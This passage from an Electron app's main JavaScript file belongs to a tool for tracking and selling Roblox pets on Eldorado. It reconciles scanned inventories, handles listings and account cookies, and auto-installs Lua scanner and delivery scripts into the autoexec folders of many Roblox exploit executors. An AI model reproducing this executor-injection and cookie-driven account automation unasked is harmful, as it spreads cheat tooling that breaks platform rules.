    if (!importPets.warned.has(k)) { importPets.warned.add(k); store.log('warn', `[Scanner] @${raw.username} is not a saved account - its base is not synced (add it in Roblox Accounts)`); }
    return { added: 0, removed: 0, skipped: true, notSaved: raw.username };
  }
  // how many pets that base holds (its podiums), for Roblox Accounts → Base slots
  if (replace && raw && raw.username && Number(raw.slots) > 0) { const sa = accounts.find(a => a.username.toLowerCase() === String(raw.username).toLowerCase()); if (sa && Number(raw.slots) > (Number(sa.slots) || 0)) sa.slots = Number(raw.slots); }
  if (replace && raw && raw.username && raw.rebirths != null) { const sa = accounts.find(a => a.username.toLowerCase() === String(raw.username).toLowerCase()); if (sa) sa.rebirths = Number(raw.rebirths); }
  if (replace && raw && raw.uuidInfo && raw.username) {
    const ui = raw.uuidInfo, k = String(raw.username).toLowerCase();
    importPets.uuidLogged = importPets.uuidLogged || new Set();
    if (!importPets.uuidLogged.has(k)) {
      importPets.uuidLogged.add(k);
      store.log('info', `[Scanner] @${raw.username}: ${ui.withUuid || 0}/${(raw.pets || []).length} pets with uuid${ui.uuidFrom ? ' (from ' + ui.uuidFrom + ')' : ''}; cache entry fields: ${ui.entryKeys || '?'} (list key ${ui.listKey || '?'}); model attributes: ${ui.modelAttrs || '?'}`);
    }
  }
  const fixed = accounts.find(a => a.id === accountId);
  const items = sab.normalizePetImport(raw, fixed ? fixed.username : '');
  // one uuid on two pets of the same import is not a real brainrot uuid (see dedupeUuids)
  { const n = {}; for (const it of items) if (it.uuid) n[it.uuid] = (n[it.uuid] || 0) + 1; for (const it of items) if (it.uuid && n[it.uuid] > 1) delete it.uuid; }
  const added = [];
  let removed = 0;
  let dropped = [];      // unlisted pets of the scanned accounts, re-matched below
  let sessionLeft = [];  // pasted pets of the scanned accounts, adopted when the scan shows them
  // pasted JSON: a pet Zotac already has on that account (scanned inventory or an earlier paste)
  // is that pet, not a second copy; it shows in Auto List again
  const have = replace ? [] : store.get('pets').filter(p => p.status !== 'sold' && !p.delivered);
  const matched = [];
  // pets of deliveries still running or waiting for the seller
  const inDelivery = new Set();
  for (const d of Object.values(store.get('deliveries') || {})) if (d && !['done', 'cancelled'].includes(d.state)) for (const id of d.petIds || []) inDelivery.add(id);
  if (replace) {
    const names = new Set(items.map(it => String(it.account || (fixed && fixed.username) || '').toLowerCase()).filter(Boolean));
    if (!items.length && raw && raw.username) names.add(String(raw.username).toLowerCase());
    const ids = new Set(accounts.filter(a => names.has(a.username.toLowerCase())).map(a => a.id));
    const before = store.get('pets').length;
    // a scan that could not read traits must not wipe the traits we already know
    if (raw && raw.traitsKnown === false) {
      const old = {};
      for (const p of store.get('pets')) if (ids.has(p.accountId) && (p.traits || []).length) (old[sab.norm(p.name) + '|' + sab.norm(p.mutation)] ||= []).push(p.traits);
      for (const it of items) {
        const q = old[sab.norm(it.name) + '|' + sab.norm(it.mutation || 'None')];
        if ((!it.traits || !it.traits.length) && q && q.length) it.traits = q.shift();
      }
    }
    // pasted pets are not part of the synced inventory: a rescan never drops them, but
    // one the scan shows in that base becomes that inventory pet (no second copy)
    sessionLeft = store.get('pets').filter(p => ids.has(p.accountId) && p.status === 'available' && p.session);
    dropped = store.get('pets').filter(p => ids.has(p.accountId) && p.status === 'available' && !inDelivery.has(p.id) && !p.session);
    store.set('pets', store.get('pets').filter(p => !(ids.has(p.accountId) && p.status === 'available' && !inDelivery.has(p.id) && !p.session)));
    removed = before - store.get('pets').length;
  }
  // Pets still physically in the base that Zotac already tracks: listed ones, sold ones not
  // delivered yet (recent), and any pet of a running delivery (its job holds the pet id; a fresh
  // id would make the delivery lose it). A rescan must not re-add them as new available pets.
  const listedLeft = replace ? store.get('pets').filter(p => p.status === 'listed' || inDelivery.has(p.id)
    || (p.status === 'sold' && !p.delivered && Date.now() - (p.soldAt || 0) < 3 * 864e5)) : [];
  const skippedNames = new Set();
  const moved = [];   // { pet, from }: brainrots this scan found on another account than Zotac had them
  for (const it of items) {
    let acct = fixed;
    if (!acct && it.account) {
      acct = accounts.find(a => a.username.toLowerCase() === String(it.account).toLowerCase());
      if (!acct && onlySaved) { skippedNames.add(String(it.account)); continue; }   // never makes new accounts
      if (!acct) { acct = { id: rid(6), username: String(it.account), note: '', createdAt: Date.now() }; accounts.push(acct); }
      if (raw && raw.userId && String(raw.username || '').toLowerCase() === acct.username.toLowerCase()) acct.robloxUserId = raw.userId;
    }
    if (onlySaved && !acct) continue;
    // same uuid = the same brainrot, whatever changed on it; two different uuids are never the same
    // pet. Without a uuid on one side (old records, a scan that could not read it) the old rules apply.
    const u = it.uuid || null;
    const fits = p => !u || !p.uuid || p.uuid === u;
    const sameU = p => !!u && p.uuid === u;
    const adopt = p => { if (u) p.uuid = u; };
    if (replace && acct) {
      // exact uuid first: a listed/sold pet, an unlisted one, a pasted one
      let ui = u ? listedLeft.findIndex(p => p.accountId === acct.id && sameU(p)) : -1;
      if (ui >= 0) { const was = listedLeft.splice(ui, 1)[0]; if (was.session) was.session = false; continue; }
      ui = u ? dropped.findIndex(p => !p._kept && p.accountId === acct.id && sameU(p)) : -1;
      if (ui >= 0) {
        // the scan is the truth for what this pet is now (mutation machine, new traits)
        const old = dropped[ui]; old._kept = true;
        old.mutation = it.mutation || 'None'; if (it.gen) old.gen = it.gen;
        if ((it.traits || []).length || (raw && raw.traitsKnown !== false)) old.traits = it.traits || [];
        if (it.rarity) old.rarity = it.rarity;
        store.get('pets').push(old); continue;
      }
      ui = u ? sessionLeft.findIndex(p => p.accountId === acct.id && sameU(p)) : -1;
      if (ui >= 0) { const was = sessionLeft.splice(ui, 1)[0]; was.session = false; continue; }
      // the same brainrot (uuid) Zotac has on another account: it was moved here (trade, steal, by
      // hand), so its record follows it - listing, price and card included - instead of the old
      // account keeping it and this one getting a copy. A pet of a running delivery is left to it.
      if (u) {
        const elsewhere = p => p.accountId && p.accountId !== acct.id && sameU(p) && !p.delivered && p.status !== 'sold';
        let mv = dropped.find(p => !p._kept && elsewhere(p));
        if (mv) { mv._kept = true; store.get('pets').push(mv); }
        else mv = store.get('pets').find(elsewhere);
        if (mv && inDelivery.has(mv.id)) continue;
        if (mv) {
          for (const list of [listedLeft, sessionLeft]) { const x = list.indexOf(mv); if (x >= 0) list.splice(x, 1); }
          moved.push({ pet: mv, from: mv.accountId });
          mv.accountId = acct.id; mv.session = false;
          mv.mutation = it.mutation || 'None'; if (it.gen) mv.gen = it.gen;
          if ((it.traits || []).length || (raw && raw.traitsKnown !== false)) mv.traits = it.traits || [];
          if (it.rarity) mv.rarity = it.rarity;
          continue;
        }
      }
      const i = listedLeft.findIndex(p => p.accountId === acct.id && fits(p) && sab.norm(p.name) === sab.norm(it.name) && sab.norm(p.mutation) === sab.norm(it.mutation || 'None'));
      if (i >= 0) { const was = listedLeft.splice(i, 1)[0]; if (was.session) was.session = false; adopt(was); continue; }
      // the exact same pet as an unlisted one Zotac already had: keep that one (same id, price,
      // title, card...) instead of a fresh copy
      const key = sab.petKey({ ...it, mutation: it.mutation || 'None' });
      const j = dropped.findIndex(p => !p._kept && p.accountId === acct.id && fits(p) && sab.petKey(p) === key);
      if (j >= 0) { const old = dropped[j]; old._kept = true; if (it.rarity) old.rarity = it.rarity; adopt(old); store.get('pets').push(old); continue; }
      const sj = sessionLeft.findIndex(p => p.accountId === acct.id && fits(p) && sab.petKey(p) === key);
      if (sj >= 0) { const was = sessionLeft.splice(sj, 1)[0]; was.session = false; if (it.rarity) was.rarity = it.rarity; adopt(was); continue; }
    }
    if (!replace && acct) {
      const key = sab.petKey({ ...it, mutation: it.mutation || 'None' });
      let j = u ? have.findIndex(p => p.accountId === acct.id && sameU(p)) : -1;
      if (j < 0) j = have.findIndex(p => p.accountId === acct.id && fits(p) && sab.petKey(p) === key);
      if (j >= 0) { const old = have.splice(j, 1)[0]; if (old.alHidden) old.alHidden = false; adopt(old); matched.push(old); continue; }
    }
    const pet = { id: rid(6), uuid: u || undefined, accountId: acct ? acct.id : null, name: it.name, mutation: it.mutation || 'None', gen: it.gen || 0, traits: it.traits || [], rarity: it.rarity || '', cost: it.cost || 0, status: it.offerId ? 'listed' : 'available', offerId: it.offerId || null, price: it.price || null, createdAt: Date.now() };
    store.get('pets').push(pet); added.push(pet);
  }
  const kept = dropped.filter(p => p._kept);
  for (const p of kept) delete p._kept;
  removed -= kept.length;
  // what the scan no longer shows left the base without a Zotac trade (sold/traded by hand, stolen,
  // fused): remembered in the ledger. Only when the scan is complete (count matches the game's own),
  // so a half-loaded base never reports pets as gone; a pet that only changed (same name and
  // mutation, gen/s within ~1k) is not "gone".
  const complete = replace && raw && Array.isArray(raw.pets) && raw.expected != null && raw.pets.length >= raw.expected;
  const lost = dropped.filter(p => !kept.includes(p));
  if (complete && lost.length) {
    const k = p => sab.norm(p.name) + '|' + sab.norm(p.mutation || 'None') + '|' + Math.round((Number(p.gen) || 0) / 1000);
    const still = {};
    for (const p of added) still[k(p)] = (still[k(p)] || 0) + 1;
    // with uuids it is exact: a pet whose uuid the scan no longer shows is gone (a new identical
    // pet has a new uuid)
    const seenU = new Set(items.map(it => it.uuid).filter(Boolean));
    const gone = lost.filter(p => { if (p.uuid && seenU.size) return !seenU.has(p.uuid); if (still[k(p)] > 0) { still[k(p)]--; return false; } return true; });
    const uname = id => (accounts.find(a => a.id === id) || {}).username || null;
    for (const [acc, list] of Object.entries(gone.reduce((m, p) => ((m[p.accountId] ||= []).push(p), m), {}))) {
      delivery.record('gone', { from: uname(acc), pets: list, note: 'no longer in the base (not traded by Zotac)' });
    }
  }
  // pasted pets of an account whose complete scan no longer shows them left that base: dropped
  // (they stay over restarts now, so a rescan has to clear them; never one of a running delivery)
  let pastedGone = 0;
  if (complete && sessionLeft.length) {
    const drop = new Set(sessionLeft.filter(p => p.status === 'available' && !inDelivery.has(p.id)));
    pastedGone = drop.size;
    if (drop.size) store.set('pets', store.get('pets').filter(p => !drop.has(p)));
  }
  if (moved.length || pastedGone) {
    const uname = id => (accounts.find(a => a.id === id) || {}).username || '?';
    for (const m of moved) {
      store.log('info', `[Scanner] ${m.pet.mutation && m.pet.mutation !== 'None' ? m.pet.mutation + ' ' : ''}${m.pet.name} moved from @${uname(m.from)} to @${uname(m.pet.accountId)} (same brainrot uuid)`);
      delivery.record('moved', { from: uname(m.from), to: uname(m.pet.accountId), pets: [m.pet], note: 'found on another account in a scan' });
    }
    if (pastedGone) store.log('info', `[Scanner] ${pastedGone} pasted pet(s) no longer in their base - removed from Auto List`);
  }
  if (onlySaved && !fixed) for (const it of items) if (!it.account) skippedNames.add('(no account in the JSON)');
  dedupeUuids();   // a uuid this import gave to a pet another account already holds
  store.save(); send('pets:changed');
  return { added: added.length, removed: removed + pastedGone, kept: kept.length, matched: matched.length, moved: moved.length, accounts: accounts.length, skipped: [...skippedNames] };
}

function scannerScript(which = 'scanner') {
  const s = store.get('settings');
  const file = path.join(__dirname, 'scanner', which === 'delivery' ? 'zotac_delivery.lua' : 'zotac_scanner.lua');
  let src = fs.readFileSync(file, 'utf8')
    .replace('local ZOTAC_PORT  = 47321', `local ZOTAC_PORT  = ${s.localPort || 47321}`)
    .replace('local ZOTAC_TOKEN = "PASTE_AGENT_TOKEN"', `local ZOTAC_TOKEN = "${s.agentToken}"`);
  // the autoexec copy scans quietly (no window) on every account Zotac opens
  if (which === 'scanner-auto') src = src.replace('local SHOW_GUI = true', 'local SHOW_GUI = false').replace('local SYNC = false', 'local SYNC = true');
  return src;
}

// Delivery agent + scanner in the executor's autoexec, so they start by itself in every Roblox
// client the executor attaches to (Zotac launches + closes stock accounts per order). Each is only
// there while its switch is on: Auto Delivery (delivery.enabled) -> zotac_delivery.lua, Auto Scanner
// (scanner.autoexec) -> zotac_scanner.lua; switched off = the file is removed from every folder.
// Synapse Z always gets them; Volt / Real only when Zotac's scripts were there before (remembered
// in settings.autoexecRemoved after a removal). Rewritten on every start and token change, so
// autoexec never runs a stale version or an old token.
let lastAutoexec = [];
let lastAutoexecRemoved = [];
function autoexecTargets() {
  const base = process.env.LOCALAPPDATA || '';
  const roam = process.env.APPDATA || '';
  const targets = [
    { dir: path.join(base, 'Synapse Z', 'autoexec'), always: true },
    { dir: path.join(base, 'Volt', 'autoexec'), always: false },
    { dir: path.join(base, 'Real', 'autoexec'), always: false },
    // other executors that keep autoexec in AppData: installed into when the folder exists
    ...['Wave', 'Solara', 'Xeno', 'Seliware', 'Velocity', 'Swift', 'Potassium', 'Volcano', 'Zenith', 'AWP', 'Codex', 'Delta', 'Krnl']
      .flatMap(n => [path.join(base, n, 'autoexec'), path.join(roam, n, 'autoexec'), path.join(base, n, 'workspace', '..', 'autoexec')])
      .map(dir => ({ dir: path.normalize(dir), always: true })),
    // folders picked on the Auto Delivery page (any executor, wherever it is installed)
    ...((store.get('settings').delivery || {}).autoexecDirs || []).map(dir => ({ dir, always: true }))
  ].filter((t, i, all) => all.findIndex(x => x.dir.toLowerCase() === t.dir.toLowerCase()) === i);
  const s = store.get('settings');
  const removed = new Set((s.autoexecRemoved || []).map(d => d.toLowerCase()));
  const names = ['zotac_delivery.lua', 'zotac_scanner.lua'];
  // a folder is used when it exists and is for sure an executor Zotac installs into
  return targets.filter(t => fs.existsSync(t.dir) && (t.always || removed.has(t.dir.toLowerCase()) || names.some(n => fs.existsSync(path.join(t.dir, n)))));
}
const AUTOEXEC_FILES = { delivery: 'zotac_delivery.lua', scanner: 'zotac_scanner.lua' };
// the delivery agent is in autoexec while Auto Delivery is on, and also while any delivery job waits
// (Simulator / Start auto delivery with Auto Delivery off: the launched game had no agent, so the
// job sat pending and no trade was ever sent)
const deliveryJobsActive = () => store.get('jobs').some(j => ['pending', 'running'].includes(j.status));
function autoexecWanted() {
  const s = store.get('settings');
  return { 'zotac_delivery.lua': !!(s.delivery || {}).enabled || deliveryJobsActive(), 'zotac_scanner.lua': (s.scanner || {}).autoexec !== false };
}
function syncDeliveryAutoexec() {
  if (process.env.ZOTAC_NO_AUTOEXEC) return;
  const want = autoexecWanted()['zotac_delivery.lua'];
  const has = (lastAutoexec || []).some(f => /zotac_delivery\.lua$/i.test(f));
  if (want !== has) try { syncAutoexec(); } catch (e) { store.log('warn', '[Autoexec] ' + e.message); }
}
function syncAutoexec() {
  if (process.env.ZOTAC_NO_AUTOEXEC) return lastAutoexec;   // test copies must not overwrite the real autoexec
  const targets = autoexecTargets();
  const want = autoexecWanted();
  const s = store.get('settings');
  const removedDirs = new Set((s.autoexecRemoved || []).map(d => d.toLowerCase()));
  const files = [['zotac_delivery.lua', () => scannerScript('delivery')], ['zotac_scanner.lua', () => scannerScript('scanner-auto')]];
  const done = [], gone = [];
  for (const t of targets) for (const [name, script] of files) {
    const f = path.join(t.dir, name);
    if (name === 'zotac_delivery.lua') try { const old = path.join(t.dir, 'meowl_delivery.lua'); if (fs.existsSync(old)) fs.unlinkSync(old); } catch { /* in use */ }
    try {
      if (!want[name]) {   // switched off: not in this autoexec
        if (fs.existsSync(f)) { fs.unlinkSync(f); gone.push(f); }
        removedDirs.add(t.dir.toLowerCase());   // so switching on puts it back here too
        continue;
      }
      const src = script();
      if (fs.existsSync(f) && fs.readFileSync(f, 'utf8') === src) { done.push(f); continue; }
      fs.writeFileSync(f, src);
      done.push(f);
    } catch (e) { store.log('warn', `[Autoexec] ${f}: ${e.message}`); }
  }
  const nextRemoved = [...removedDirs];
  if (nextRemoved.join('|') !== (s.autoexecRemoved || []).map(d => d.toLowerCase()).join('|')) { s.autoexecRemoved = nextRemoved; store.save(); }
  if (gone.length) store.log('info', '[Autoexec] removed: ' + gone.join(', '));
  if (done.length) store.log('info', '[Autoexec] installed: ' + done.join(', '));
  lastAutoexec = done; lastAutoexecRemoved = gone;
  return done;
}

// --- IPC ------------------------------------------------------------------
function handle(ch, fn) {
  ipcMain.handle(ch, async (_e, ...args) => {
    try { return { ok: true, value: await fn(...args) }; }
    catch (e) { return { ok: false, error: e.message, status: e.status, data: e.data }; }
  });
}

function ipc() {
  handle('app:info', async () => ({
    version: app.getVersion(), bridge: bridge.state, lastOk: bridge.lastOk, talk: delivery.talkState, talkError: delivery.talkError,
    agentOnline: delivery.agentOnline(), userData: app.getPath('userData'), lister: lister.progress, listerRunning: lister.running,
    repricerLast: repricer.lastRun, watcherLast: watcher.lastPoll, successRate: appInfoRate,
    extensionPath: fs.existsSync(path.join(__dirname, 'extension')) ? path.join(__dirname, 'extension') : path.join(process.resourcesPath, 'extension')
  }));
  handle('win', a => { if (!win) return; if (a === 'min') win.minimize(); else if (a === 'max') win.isMaximized() ? win.unmaximize() : win.maximize(); else if (a === 'close') win.close(); });
  handle('open:external', url => { if (/^https:\/\//.test(url)) shell.openExternal(url); });
  handle('open:path', p => shell.openPath(p));

  // auth
  handle('auth:loginBrowser', () => new Promise(resolve => {
    const w = new BrowserWindow({ width: 520, height: 760, parent: win, modal: false, title: 'Login to Eldorado', autoHideMenuBar: true, webPreferences: { partition: PARTITION } });
    w.loadURL(ORIGIN + '/sell/place-offer');
    let done = false;
    const check = async () => {
      if (done || w.isDestroyed()) return;
      const u = w.webContents.getURL();
      if (u.startsWith(ORIGIN) && !/auth-callback/.test(u)) {
        await bridge.reload();
        try { const me = await eld.me(true); if (me && (me.id || me.username)) { done = true; w.close(); await afterLogin(); resolve(me); } } catch { /* keep waiting */ }
      }
    };
    w.webContents.on('did-navigate', check);
    w.webContents.on('did-navigate-in-page', check);
    w.on('closed', async () => { if (!done) { await bridge.reload(); try { resolve(await eld.me(true)); afterLogin(); } catch { resolve(null); } } });
  }));
  handle('auth:cookie', async str => { const n = await bridge.setCookieString(str); const me = await eld.me(true); afterLogin(); return { set: n, me }; });
  handle('auth:logout', async () => { watcher.stop(); await bridge.logout(); eld.cache.me = null; return true; });
  handle('auth:me', () => eld.me(true));

  // eldorado
  handle('eld:dashboard', () => eld.dashboard());
  handle('eld:wallet', () => eld.wallet());
  handle('eld:orders', q => eld.soldOrders(q || {}));
  handle('eld:order', id => eld.order(id));
  handle('eld:deliver', id => eld.deliverOrder(id));
  handle('eld:cancelOrder', (id, reason) => eld.cancelOrder(id, reason));
  handle('eld:notifications', unread => eld.notifications(unread));
  handle('eld:markRead', id => eld.markRead(id));
  handle('eld:markAllRead', () => eld.markAllRead());
  handle('eld:reviews', p => eld.reviews(p));
  handle('eld:search', q => eld.searchMarket(q));
  handle('eld:myOffers', st => eld.myOffersAll(st));
  handle('eld:offerAction', async (id, action, arg) => {
    if (action === 'pause') return eld.pauseOffer(id);
    if (action === 'resume') return eld.resumeOffer(id);
    if (action === 'delete') { const r = await eld.deleteOffer(id); for (const p of store.get('pets')) if (p.offerId === id && p.status === 'listed') { p.status = 'available'; p.offerId = null; } store.save(); send('pets:changed'); return r; }
    if (action === 'price') return eld.setPrice(id, arg);
    throw new Error('bad action');
  });
  handle('listings:reconcile', () => reconListed());
  handle('eld:items', () => eld.itemList());
  handle('eld:attrs', async () => { await eld.library(); return { attrs: eld.cache.attrs, game: store.get('settings').game }; });
  handle('eld:reloadLibrary', () => eld.library(true).then(() => eld.itemList()));
  handle('eld:raw', (method, p, body, query) => bridge.request(method, p, { body, query }));
  handle('eld:message', (orderId, text) => delivery.chat(orderId, text));
  handle('chat:history', (orderId, conversationId) => delivery.history(orderId, conversationId));
  handle('chat:buyerRoblox', async orderId => { try { const v = await eld.deliveryDetail(orderId); return typeof v === 'string' ? v : (v && (v.value || v.username)) || null; } catch { return null; } });
  handle('eld:profile', u => eld.publicProfile(u));

  // pricing
  handle('price:smart', async petOrId => {
    const pet = typeof petOrId === 'string' ? store.get('pets').find(p => p.id === petOrId) : petOrId;
    let myId = null; try { const me = await eld.me(); myId = me.id || me.userId; } catch { /* logged out is fine */ }
    return smartPrice(eld, pet, store.get('settings'), myId);
  });

  // pets
  handle('pets:list', () => store.get('pets'));
  handle('server:scans', () => Object.values(serverScans).sort((a, b) => b.receivedAt - a.receivedAt));
  // Parsing pasted scanner JSON: Auto List pets that stay until listed or removed (also over a restart),
  // linked to the matching saved account (or the one picked) so they can be delivered, and kept out
  // of that account's inventory. Bases of accounts Zotac doesn't have are skipped.
  handle('pets:import', (json, accountId) => {
    const before = new Set(store.get('pets').map(p => p.id));
    const r = importPets(json, accountId, { onlySaved: true });
    for (const p of store.get('pets')) if (!before.has(p.id)) p.session = true;
    store.save();
    return r;
  });
  handle('scanner:script', which => scannerScript(which));
  handle('art:for', pet => artFor(pet, (store.get('settings').autolist || {}).imageFolder));
  // card thumbnails: { pets: {name: dataUrl}, traits: {name: dataUrl}, mutations: {...} },
  // shrunk once with nativeImage and cached in userData/art/thumbs
  handle('art:thumbs', async ({ pets = [], traits = [], mutations = [] } = {}) => {
    const dir = path.join(app.getPath('userData'), 'art', 'thumbs');
    fs.mkdirSync(dir, { recursive: true });
    const thumb = async (kind, name, size, source) => {
      const f = path.join(dir, kind + '-' + sab.norm(name) + '-' + size + '.png');
      if (fs.existsSync(f)) return 'data:image/png;base64,' + fs.readFileSync(f).toString('base64');
      const url = await source().catch(() => null);
      if (!url) return null;
      let img = nativeImage.createFromDataURL(url);
      if (img.isEmpty()) return null;
      const { width, height } = img.getSize();
      if (Math.max(width, height) > size) img = img.resize(width >= height ? { width: size, quality: 'best' } : { height: size, quality: 'best' });
      const png = img.toPNG();
      fs.writeFileSync(f, png);
      return 'data:image/png;base64,' + png.toString('base64');
    };
    const out = { pets: {}, traits: {}, mutations: {} };
    await Promise.all([
      ...[...new Set(pets)].map(async n => { out.pets[n] = await thumb('pet', n, 220, async () => localPetImage((store.get('settings').autolist || {}).imageFolder, n) || await wiki.picture(n) || await art.petPicture(n, 'None')); }),
      ...[...new Set(traits)].map(async n => { out.traits[n] = await thumb('trait', n, 48, () => art.dataUrl('traits', n)); }),
      ...[...new Set(mutations)].map(async n => { out.mutations[n] = await thumb('mut', n, 48, () => art.dataUrl('mutations', n)); })
    ]);
    return out;
  });
  handle('art:status', () => art.status());
  // the card saved by "Generate Images" for a pet, as a data URL (null when missing)
  // small preview of a pet's generated card for the Auto List rows
  handle('art:cardThumb', id => {
    const p = store.get('pets').find(x => x.id === id);
    if (!p || !p.imagePath || !fs.existsSync(p.imagePath)) return null;
    let img = nativeImage.createFromPath(p.imagePath);
    if (img.isEmpty()) return null;
    img = img.resize({ width: 112, quality: 'best' });
    return 'data:image/png;base64,' + img.toPNG().toString('base64');
  });
  handle('art:card', id => {
    const p = store.get('pets').find(x => x.id === id);
    if (!p || !p.imagePath || !fs.existsSync(p.imagePath)) return null;
    return 'data:image/png;base64,' + fs.readFileSync(p.imagePath).toString('base64');
  });
  handle('pets:add', p => { const pet = { id: rid(6), status: 'available', mutation: 'None', traits: [], cost: 0, createdAt: Date.now(), manual: true, ...p, gen: sab.parseGen(p.gen) }; store.get('pets').push(pet); store.save(); send('pets:changed'); return pet; });
  handle('pets:update', (ids, patch) => {
    const set = new Set([].concat(ids));
    for (const p of store.get('pets')) if (set.has(p.id)) { Object.assign(p, patch); if (patch.gen !== undefined) p.gen = sab.parseGen(patch.gen); if (patch.status === 'sold' && !p.soldAt) p.soldAt = Date.now(); }
    store.save(); send('pets:changed'); return true;
  });
  // Auto List ✕: off Auto List only. A scanned pet stays in its account's inventory (hidden from
  // Auto List, put back from the "Removed" filter); a pasted pet only lives in Auto List,
  // so it is deleted unless it is listed or sold. Eldorado offers are never touched.
  handle('pets:autolistRemove', ids => {
    const set = new Set([].concat(ids));
    let hidden = 0, deleted = 0;
    const keep = [];
    for (const p of store.get('pets')) {
      if (!set.has(p.id)) { keep.push(p); continue; }
      if (p.session && p.status === 'available' && !p.orderId) { deleted++; continue; }
      p.alHidden = true; hidden++; keep.push(p);
    }
    store.set('pets', keep); send('pets:changed');
    return { hidden, deleted };
  });
  handle('pets:autolistRestore', ids => {
    const set = new Set([].concat(ids));
    let n = 0;
    for (const p of store.get('pets')) if (set.has(p.id) && p.alHidden) { p.alHidden = false; n++; }
    store.save(); send('pets:changed');
    return n;
  });
  handle('pets:delete', ids => { const set = new Set(ids); store.set('pets', store.get('pets').filter(p => !set.has(p.id))); send('pets:changed'); return true; });
  handle('pets:quickFill', (ids, tpl) => {
    const al = store.get('settings').autolist;
    const accounts = store.get('accounts');
    for (const p of store.get('pets')) {
      if (!ids.includes(p.id)) continue;
      const acct = accounts.find(a => a.id === p.accountId);
      const vars = { account: acct && acct.username, emoji: al.emoji };
      if (tpl.title !== undefined) p.title = tpl.title ? sab.fillTemplate(tpl.title, p, vars) : '';
      if (tpl.description !== undefined) p.description = tpl.description ? sab.fillTemplate(tpl.description, p, vars) : '';
      if (tpl.deliveryTime) p.deliveryTime = tpl.deliveryTime;
      if (tpl.price !== undefined && tpl.price !== '' && tpl.price !== null) { p.price = Number(tpl.price); p.priceLocked = true; }
      if (tpl.clearPrice) { p.price = null; p.priceLocked = false; }
    }
    void al; store.save(); send('pets:changed'); return true;
  });
  // "Generate Images": render each pet's listing card once and keep it in userData/art/cards;
  // Auto List uploads the saved card instead of rendering again
  handle('pets:generateImages', async ids => {
    const dir = path.join(app.getPath('userData'), 'art', 'cards');
    fs.mkdirSync(dir, { recursive: true });
    const al = store.get('settings').autolist || {};
    let idx = null; try { idx = await eld.itemIndex(); } catch { /* rarity is optional */ }
    const out = { ok: 0, failed: 0, errors: [] };
    for (const p of store.get('pets').filter(x => ids.includes(x.id))) {
      try {
        const item = idx ? sab.findItem(idx, p.name) : null;
        const b64 = await renderImage({ pet: p, rarity: (item && item.rarity) || p.rarity, imageFolder: al.imageFolder });
        if (!b64) throw new Error('empty image');
        const f = path.join(dir, String(p.id).replace(/[^\w-]/g, '') + '.png');
        fs.writeFileSync(f, Buffer.from(b64, 'base64'));
        p.imagePath = f; p.imageAt = Date.now(); out.ok++;
        send('pets:changed');
      } catch (e) { out.failed++; out.errors.push(`${p.name}: ${e.message}`); }
    }
    store.save(); send('pets:changed'); return out;
  });
  handle('pets:markSold', (ids, price) => {
    for (const p of store.get('pets')) if (ids.includes(p.id)) {
      p.status = 'sold'; p.soldAt = Date.now(); p.soldPrice = price != null && price !== '' ? Number(price) : (p.soldPrice || p.price || 0);
      store.get('sales').unshift({ id: rid(6), orderId: null, title: `${p.name} ${p.mutation !== 'None' ? p.mutation : ''}`.trim(), price: p.soldPrice, buyer: '', date: new Date().toISOString(), petIds: [p.id], source: 'manual' });
    }
    store.save(); send('pets:changed'); return true;
  });

  // accounts
  const publicAccount = ({ cookieEnc, ...a }) => ({ ...a, hasCookie: !!cookieEnc });
  handle('accounts:list', () => store.get('accounts').map(publicAccount));
  handle('accounts:setCookie', (id, cookie) => launcher.setCookie(id, cookie));
  handle('accounts:loginBrowser', async id => { const r = await launcher.loginBrowser(id || null, win); send('pets:changed'); return r; });
  // manual Start: the account's own mode (SCRIPT = executor client, Legit = real Roblox)
  handle('accounts:launch', (id, force) => { const a = store.get('accounts').find(x => x.id === id); return launcher.launch(id, { force: !!force, legit: !!(a && a.legit) }); });
  handle('legit:status', () => launcher.legit.status());
  handle('legit:install', () => launcher.legit.reinstall().then(exe => ({ exe })));
  handle('accounts:launchAll', async () => { const out = []; for (const a of store.get('accounts').filter(x => x.cookieEnc)) { try { out.push({ username: a.username, ...(await launcher.launch(a.id, { legit: !!a.legit })) }); } catch (e) { out.push({ username: a.username, error: e.message }); } await new Promise(r => setTimeout(r, 2000)); } return out; });
  handle('launcher:status', () => launcher.status());
  handle('launcher:fix', () => launcher.fixLaunch());
  handle('accounts:save', async a => {
    const list = store.get('accounts');
    let acct = list.find(x => x.id === a.id);
    if (!acct) { acct = { id: rid(6), createdAt: Date.now() }; list.push(acct); }
    const { cookieEnc, hasCookie, ...clean } = a; void cookieEnc; void hasCookie;
    Object.assign(acct, clean, { id: acct.id });
    if (acct.username && !acct.robloxUserId) {
      try { const u = await robloxUser(acct.username); if (u) { acct.robloxUserId = u.id; acct.displayName = u.displayName; acct.avatar = await robloxAvatar(u.id); } } catch { /* offline */ }
    }
    store.save(); return publicAccount(acct);
  });
  handle('accounts:delete', id => {
    const mine = store.get('pets').filter(p => p.accountId === id);
    const busy = mine.filter(p => p.status === 'listed' || (p.status === 'sold' && !p.delivered));
    if (busy.length) throw new Error(`This account still has ${busy.length} pet(s) listed or sold but not delivered — delete those offers or finish the orders first`);
    if (store.get('jobs').some(j => j.accountId === id && ['pending', 'running'].includes(j.status))) throw new Error('This account has a delivery job running');
    store.set('accounts', store.get('accounts').filter(a => a.id !== id));
    store.set('pets', store.get('pets').filter(p => !(p.accountId === id && p.status === 'available')));
    store.save(); send('pets:changed'); return true;
  });
  // all accounts (Copy All), or one account with the pets now in its base (the copy button on its card);
  // same format, so either pastes into Import JSON / Auto List
  handle('accounts:export', id => JSON.stringify({ format: 'zotac-accounts', version: 1, accounts: store.get('accounts').filter(a => !id || a.id === id).map(a => ({ ...publicAccount(a), pets: store.get('pets').filter(p => p.accountId === a.id && (!id || (!p.delivered && p.status !== 'sold'))) })) }, null, 2));
  handle('accounts:import', json => {
    const j = typeof json === 'string' ? JSON.parse(json) : json;
    const src = Array.isArray(j) ? j : j.accounts || [];
    let na = 0, np = 0;
    for (const a of src) {
      const list = store.get('accounts');
      let acct = list.find(x => x.username && a.username && x.username.toLowerCase() === a.username.toLowerCase());
      if (!acct) { acct = { id: rid(6), username: a.username || a.name || 'account', note: a.note || '', robloxUserId: a.robloxUserId || null, avatar: a.avatar || null, createdAt: Date.now() }; list.push(acct); na++; }
      const have = {};
      for (const p of store.get('pets')) if (p.accountId === acct.id && !p.delivered && p.status !== 'sold') have[sab.petKey(p)] = (have[sab.petKey(p)] || 0) + 1;
      for (const p of a.pets || []) {
        if (p.delivered || p.status === 'sold') continue;                   // gone from that base
        const q = { ...p, gen: sab.parseGen(p.gen) }, k = sab.petKey(q);
